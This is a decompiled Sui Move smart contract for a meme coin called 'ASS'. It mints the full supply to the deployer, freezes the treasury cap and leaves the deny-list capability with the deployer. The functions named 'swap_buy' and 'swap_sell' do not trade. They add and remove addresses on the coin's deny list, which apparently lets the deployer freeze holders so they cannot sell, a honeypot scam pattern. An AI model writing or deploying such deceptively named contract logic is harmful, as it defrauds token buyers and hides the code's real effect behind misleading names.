module 0xc8b6e24517ba5bcb4acb418a6f20a7b17f7778c6e0d13be9eec22f315ebfa255::ass {
    struct ASS has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: ASS, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<ASS>(arg0, 9, b"ASS", b"WE LOVE ASS", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmYqF2cRhTKKUbWjBTuNsXSSNPbzFWtwd9p4ua1xFD2sHv"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<ASS>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<ASS>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<ASS>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<ASS>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ASS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<ASS>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ASS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<ASS>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

